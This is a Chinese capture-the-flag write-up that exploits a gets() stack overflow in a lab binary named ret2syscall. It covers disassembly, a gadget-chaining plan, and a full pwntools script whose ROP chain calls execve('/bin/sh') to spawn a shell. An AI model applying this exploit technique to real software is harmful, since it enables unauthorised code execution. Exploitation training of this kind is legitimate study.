1. checksec

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop]
   └─# checksec ./ret2syscall   
   [*] '/home/kali/Desktop/ret2syscall'
       Arch:     amd64-64-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x400000)
   ```
2. IDA查看，gets函数导致栈溢出，根据题目提示，就用execve系统调用获取shell
   main:

   ```
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     char v4[16]; // [rsp+0h] [rbp-10h] BYREF

     bufinit();
     puts("I leave something interesting in this program.");
     puts("Now try to find them out!");
     puts("Input: ");
     gets(v4);
     return 0;
   }
   ```

   gadget:

   ```
   .text:00000000004011A6                               public gadget
   .text:00000000004011A6                               gadget proc near
   .text:00000000004011A6                               ; __unwind {
   .text:00000000004011A6 F3 0F 1E FA                   endbr64
   .text:00000000004011AA 55                            push    rbp
   .text:00000000004011AB 48 89 E5                      mov     rbp, rsp
   .text:00000000004011AE 0F 05                         syscall                                 ; LINUX -
   .text:00000000004011B0 C3                            retn
   ```

   set rax:

   ```
   .text:0000000000401196                               ; __unwind {
   .text:0000000000401196 F3 0F 1E FA                   endbr64
   .text:000000000040119A 55                            push    rbp
   .text:000000000040119B 48 89 E5                      mov     rbp, rsp
   .text:000000000040119E 89 7D FC                      mov     [rbp+var_4], edi
   .text:00000000004011A1 8B 45 FC                      mov     eax, [rbp+var_4]
   .text:00000000004011A4 5D                            pop     rbp
   .text:00000000004011A5 C3                            retn
   .text:00000000004011A5                               ; } // starts at 401196
   ```
3. 利用分析：

   大致思路：通过 `rax`的设置需要 `rdi`的参与，所以要先设置好 `execve('/bin/sh',NULL,NULL)`的参数，再设置rax，最后跳转到 `gadget`函数

   1. 由于只能控制 `rdi`的低4位即edi，所以需要将/bin/sh写到地址较低的内存处，决定将 `/bin/sh` 字符串写到bss段 `puts(0x404048)`
   2. 接着调用 `set rax` 将 `rax` 设为 `execve` 的系统调用号 `0x3B` ，然后再设置参数，再调用gadget
   3. 由于调用 `gadget`需要一处存放着 `gadget` 地址的内存区域，令 `r15=0x404050`，在 `0x404050`处写下 `gadget`所在地址
      ```
      .text:00000000004012C0                               loc_4012C0:                             ; CODE XREF: __libc_csu_init+54↓j
      .text:00000000004012C0 4C 89 F2                      mov     rdx, r14
      .text:00000000004012C3 4C 89 EE                      mov     rsi, r13
      .text:00000000004012C6 44 89 E7                      mov     edi, r12d
      .text:00000000004012C9 41 FF 14 DF                   call    qword ptr[r15+rbx*8]
      .text:00000000004012C9
      .text:00000000004012CD 48 83 C3 01                   add     rbx, 1
      .text:00000000004012D1 48 39 DD                      cmp     rbp, rbx
      .text:00000000004012D4 75 EA                         jnz     short loc_4012C0
      .text:00000000004012D4
      .text:00000000004012D6
      .text:00000000004012D6                               loc_4012D6:                             ; CODE XREF: __libc_csu_init+35↑j
      .text:00000000004012D6 48 83 C4 08                   add     rsp, 8
      .text:00000000004012DA 5B                            pop     rbx
      .text:00000000004012DB 5D                            pop     rbp
      .text:00000000004012DC 41 5C                         pop     r12
      .text:00000000004012DE 41 5D                         pop     r13
      .text:00000000004012E0 41 5E                         pop     r14
      .text:00000000004012E2 41 5F                         pop     r15
      .text:00000000004012E4 C3                            retn
      ```
4. exp

   ```python
   from pwn import *

   context(log_level='debug', arch='amd64', os='linux')
   io = process(r'/home/kali/Desktop/ret2syscall')
   # io = gdb.debug(r'/home/kali/Desktop/ret2syscall','break *main')

   main_addr = 0x401223
   syscall_addr = 0x4011A6
   set_rax = 0x401196
   pop_csu = 0x4012DA
   mov_csu = 0x4012C0
   ret_addr = 0x401274
   puts_got_addr = 0x404018
   gets_got_addr = 0x404028
   bss_addr = 0x404048
   pop_rdi_addr = 0x4012E3
   fake_syscall_got_addr = 0x404050

   payload = b'a'*0x10 + p64(0xdeadbeef)

   # gets bin_sh_addr
   payload += p64(pop_csu) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(gets_got_addr) + p64(mov_csu) + b'a'*(7*8)

   # set up register for syscall
   payload += p64(pop_rdi_addr) + p64(59)
   payload += p64(set_rax)
   payload += p64(pop_csu) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(fake_syscall_got_addr) + p64(mov_csu)
   payload += b'\n'

   io.sendafter(b'Input: ',payload)
   io.send(b'/bin/sh\00'+p64(syscall_addr))

   io.interactive()
   ```
